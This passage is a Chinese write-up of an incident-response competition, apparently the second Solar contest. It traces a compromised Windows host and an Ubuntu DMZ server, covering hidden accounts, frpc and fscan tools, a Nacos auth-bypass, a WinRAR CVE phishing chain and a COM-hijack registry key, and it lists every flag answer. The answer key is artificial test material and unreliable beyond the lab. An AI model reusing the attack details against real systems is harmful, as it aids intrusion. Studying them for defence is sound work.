+</span></span><span class="line"><span class="cl">审计系统日志，提交攻击者远控后关闭Windows defender的时间，可使用桌面\工具\FullEventLogView辅助审计，提交示例：flag{2025/1/1 12:01:01}
+</span></span></code></pre></div><p>FullEventLogView确实很好用
+直接爆搜Windows defender就直接出了</p>
+<p>不过这里继续往上翻也能看到关闭windows defender的事件</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327214325056.png" alt=""></p>
+<pre tabindex="0"><code>flag{2025/12/24 12:24:07}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务7-1"
+    >
+        任务7
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务7-1" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务7" aria-label="Anchor to: 任务7" href="#%e4%bb%bb%e5%8a%a17-1">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：远控专项
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">审计系统日志，提交攻击者创建的用户名及远程登录IP及时间，提交示例：flag{user&amp;1.1.1.1&amp;2025/1/1 12:01:01}
+</span></span></code></pre></div><p>用户登录去Security日志里看
+根据webshell上传时间定位创建用户的时间范围</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327215147986.png" alt=""></p>
+<p>$system是隐藏用户
+登录的时候就看到了，其实可以用FullEventLogView爆搜</p>
+<pre tabindex="0"><code>flag{$system&amp;192.168.70.3&amp;2025/12/24 13:32:13}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务8"
+    >
+        任务8
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务8" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务8" aria-label="Anchor to: 任务8" href="#%e4%bb%bb%e5%8a%a18">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：恶意文件排查
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">攻击者为了进行内网渗透，上传了内网扫描及其它恶意文件，提交文件的所在路径，提交示例：flag{C:\Windows\System32}
+</span></span></code></pre></div><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327215420918.png" alt=""></p>
+<p>Administrator用户里找到frpc和fscan
+渗透常用内网转发和漏扫工具</p>
+<pre tabindex="0"><code>flag{C:\Users\Administrator\Downloads}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务9"
+    >
+        任务9
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务9" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务9" aria-label="Anchor to: 任务9" href="#%e4%bb%bb%e5%8a%a19">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：安全加固
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">清除攻击者用于权限维持添加的用户，清除完毕后前往C:\Users\Administrator\Desktop\flag\1.txt读取flag
+</span></span></code></pre></div><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327215644291.png" alt=""></p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327215714514.png" alt=""></p>
+<pre tabindex="0"><code>flag{d47cab4549e08c5227d2afd5d4e1a051}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务10"
+    >
+        任务10
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务10" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务10" aria-label="Anchor to: 任务10" href="#%e4%bb%bb%e5%8a%a110">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：安全加固
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">清除攻击者上传的所有webshell，清除完毕后前往C:\Users\Administrator\Desktop\flag\2.txt读取flag
+</span></span></code></pre></div><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327215822972.png" alt=""></p>
+<p>把之前那三个webshell删了就行</p>
+<pre tabindex="0"><code>flag{31527b4001257a29c68c357a15376e59}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务11"
+    >
+        任务11
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务11" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务11" aria-label="Anchor to: 任务11" href="#%e4%bb%bb%e5%8a%a111">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：安全加固
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">清除攻击者上传的所有恶意文件，清除完毕后前往C:\Users\Administrator\Desktop\flag\3.txt读取flag
+</span></span></code></pre></div><p>把fscan和frpc清除</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327220029712.png" alt=""></p>
+<pre tabindex="0"><code>flag{42a996202210e8572eebae2968f393db}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务12"
+    >
+        任务12
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务12" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务12" aria-label="Anchor to: 任务12" href="#%e4%bb%bb%e5%8a%a112">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：内网渗透排查
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">开始排查Ubuntu(DMZ2)环境，通过前面排查的内网扫描结果以及攻击者上传的工具，攻击者对于内网机器Ubuntu(DMZ2)进行了漏洞利用，根据相关线索本地访问相关端口，攻击者为了权限维持，后期进行获取更多信息，提交攻击者在web端新增的账号，提交示例：flag{user}
+</span></span></code></pre></div><p>下为result.txt里的扫描结果</p>
+<pre tabindex="0"><code>192.168.59.2:22 open
+192.168.59.3:80 open
+192.168.59.1:135 open
+192.168.59.3:135 open
+192.168.59.3:139 open
+192.168.59.1:139 open
+192.168.59.3:445 open
+192.168.59.1:445 open
+192.168.59.1:8834 open
+192.168.59.2:8848 open
+192.168.59.1:10001 open
+[*] NetInfo 
+[*]192.168.59.3
+   [-&gt;]WIN-S69JLUDHENG
+   [-&gt;]192.168.59.3
+   [-&gt;]192.168.70.12
+[*] NetInfo 
+[*]192.168.59.1
+   [-&gt;]DESKTOP-OA5UKMA
+   [-&gt;]192.168.59.1
+   [-&gt;]169.254.98.147
+   [-&gt;]10.0.100.53
+   [-&gt;]192.168.80.1
+   [-&gt;]192.168.70.1
+[*] NetBios 192.168.59.1    WORKGROUP\DESKTOP-OA5UKMA     
+[*] WebTitle https://192.168.59.1:8834 code:200 len:1217   title:Nessus
+[*] WebTitle http://192.168.59.2:8848  code:404 len:431    title:HTTP Status 404 – Not Found
+[+] PocScan http://192.168.59.2:8848 poc-yaml-alibaba-nacos 
+[+] PocScan http://192.168.59.2:8848 poc-yaml-alibaba-nacos-v1-auth-bypass 
+[*] WebTitle http://192.168.59.3       code:200 len:42176  title:DTcms网站管理系统 - 动力启航_开源cms_NET开源_cms建站
+[+] InfoScan http://192.168.59.3       [打印机] 
+</code></pre><p>可以看到漏洞是nacos服务
+登录虚拟机后查看网络，能看到java服务，而8848是nacos默认端口</p>
+<pre tabindex="0"><code>ss -ltnp
+</code></pre><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327223629693.png" alt=""></p>
+<p>然后上网搜索nacos的url路径和账密</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327223835802.png" alt=""></p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327224104256.png" alt=""></p>
+<p>这个应该也能在通过取证在数据库或配置文件里看到
+不过是应急响应就不当取证做了</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327224717070.png" alt=""></p>
+<p>登录后查看用户就能看到system用户</p>
+<pre tabindex="0"><code>flag{system}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务13"
+    >
+        任务13
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务13" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务13" aria-label="Anchor to: 任务13" href="#%e4%bb%bb%e5%8a%a113">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：内网渗透排查
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">攻击者在web端获取到了敏感信息后获取到了终端权限，写入了隐藏用户，提交其用户名，提交示例：flag{user}
+</span></span></code></pre></div><p>查看/etc/passwd</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327225256870.png" alt=""></p>
+<p>能看到root solar sys-update有登录权限
+而sys-update和root的UID和GID完全一致
+当然也可以试出来</p>
+<pre tabindex="0"><code>flag{sys-update}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务14"
+    >
+        任务14
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务14" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务14" aria-label="Anchor to: 任务14" href="#%e4%bb%bb%e5%8a%a114">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：安全加固
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">清除攻击者在web端新增的用户名后，前往/var/flag/1文件中读取flag并提交
+</span></span></code></pre></div><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327230450316.png" alt=""></p>
+<p>直接删除就行</p>
+<pre tabindex="0"><code>flag{ad31ea22e324ee6effd454decf7477c9}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务15"
+    >
+        任务15
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务15" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务15" aria-label="Anchor to: 任务15" href="#%e4%bb%bb%e5%8a%a115">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：安全加固
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">清除攻击者在服务器新增的用户名所有信息，前往/var/flag/2文件中读取flag并提交
+</span></span></code></pre></div><p>userdel删除显示进程占用</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327230205069.png" alt=""></p>
+<p>直接修改/etc/passwd
+根据/etc/passwd里面的内容得知sys-update的家目录是/var/tmp/.sys
+直接删除该目录</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327231254447.png" alt=""></p>
+<pre tabindex="0"><code>flag{85fdb55f08925b3ae7149e869124f2c4}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务16"
+    >
+        任务16
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务16" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务16" aria-label="Anchor to: 任务16" href="#%e4%bb%bb%e5%8a%a116">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：安全加固
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">当前web端存在漏洞，先停止此web服务进程后，前往/var/flag/3文件中读取flag并提交
+</span></span></code></pre></div><p>关闭web服务即可</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327231448927.png" alt=""></p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327231514482.png" alt=""></p>
+<pre tabindex="0"><code>flag{163e32607debcc6091e993929afe8064}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务17"
+    >
+        任务17
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务17" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务17" aria-label="Anchor to: 任务17" href="#%e4%bb%bb%e5%8a%a117">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：安全加固
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">攻击者通过web漏洞拿到了root账号密码，请修改密码后，前往/var/flag/4文件中读取flag并提交
+</span></span></code></pre></div><p>修改密码</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327231615352.png" alt=""></p>
+<pre tabindex="0"><code>flag{2d1848c8560becac27d30a5d4daf6da3}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h2 id="应急溯源"
+    >
+        应急溯源
+    </h2>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#应急溯源" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 应急溯源" aria-label="Anchor to: 应急溯源" href="#%e5%ba%94%e6%80%a5%e6%ba%af%e6%ba%90">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">用户名：setadmin
+</span></span><span class="line"><span class="cl">密码：123
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">靶场文件传输参考：https://mp.weixin.qq.com/s/_A3HiCdo6luVc6K7Ulmzpg
+</span></span></code></pre></div><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务1-3"
+    >
+        任务1
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务1-3" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务1" aria-label="Anchor to: 任务1" href="#%e4%bb%bb%e5%8a%a11-3">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：钓鱼链接地址
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">确认恶意网页地址。
+</span></span></code></pre></div><p>应该是要在浏览器记录里找
+能找到Chrome和Edge的浏览记录</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/Pasted%20image%2020260326081741.png" alt=""></p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326081830935.png" alt=""></p>
+<p>都看一遍就行，很明显看到是钓鱼的网址</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326081939940.png" alt=""></p>
+<pre tabindex="0"><code>flag{http://www.goog1e.com.cn}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务2-3"
+    >
+        任务2
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务2-3" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务2" aria-label="Anchor to: 任务2" href="#%e4%bb%bb%e5%8a%a12-3">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：漏洞识别
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">确认该事件中被利用的漏洞编号（CVE） 格式flag{CVE-xxxx-xxxx}
+</span></span></code></pre></div><p>随便翻翻能在下载里找到Google Update文件</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326082052604.png" alt=""></p>
+<p>这里先放着不管
+直接上网搜一下Google Update的CVE，没怎么找到，感觉不对，再回去看下钓鱼网站
+既然访问了钓鱼网站，那应该是跳转或者下载了什么东西</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326085815520.png" alt=""></p>
+<p>可以看到下载了rar文件，不过删除了，解压出来应该就是前面的两个文件，既然不是Google的CVE，那有可能是
+看下WinRAR版本</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326085340991.png" alt=""></p>
+<p>直接找到对应cve</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326090016087.png" alt=""></p>
+<pre tabindex="0"><code>flag{CVE-2025-8088}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务3-3"
+    >
+        任务3
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务3-3" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务3" aria-label="Anchor to: 任务3" href="#%e4%bb%bb%e5%8a%a13-3">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：应用版本
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">确定存在漏洞的应用版本，flag{x.xx.x}
+</span></span></code></pre></div><p>见任务2</p>
+<pre tabindex="0"><code>flag{7.12.0}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务4-3"
+    >
+        任务4
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务4-3" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务4" aria-label="Anchor to: 任务4" href="#%e4%bb%bb%e5%8a%a14-3">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：触发点
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">定位钓鱼文件（以主机证据为准，提交无后缀文件名）。flag格式：flag{钓鱼恶意文件名}
+</span></span></code></pre></div><p>见任务2</p>
+<pre tabindex="0"><code>flag{GoogleUpdate}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务5-3"
+    >
+        任务5
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务5-3" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务5" aria-label="Anchor to: 任务5" href="#%e4%bb%bb%e5%8a%a15-3">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：劫持手法与位置
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">确定本事件使用的劫持/加载手法类型，并提交“被劫持的位置”（注册表键路径)，flag格式：flag{HKCU\xxxxx}
+</span></span></code></pre></div><p>先看下CVE
+然后ai直接出了</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326091024350.png" alt=""></p>
+<pre tabindex="0"><code>flag{HKCU\SOFTWARE\Classes\CLSID\{1299CF18-C4F5-4B6A-BB0F-2299F0398E27}\InprocServer32}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务6-2"
+    >
+        任务6
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务6-2" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务6" aria-label="Anchor to: 任务6" href="#%e4%bb%bb%e5%8a%a16-2">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
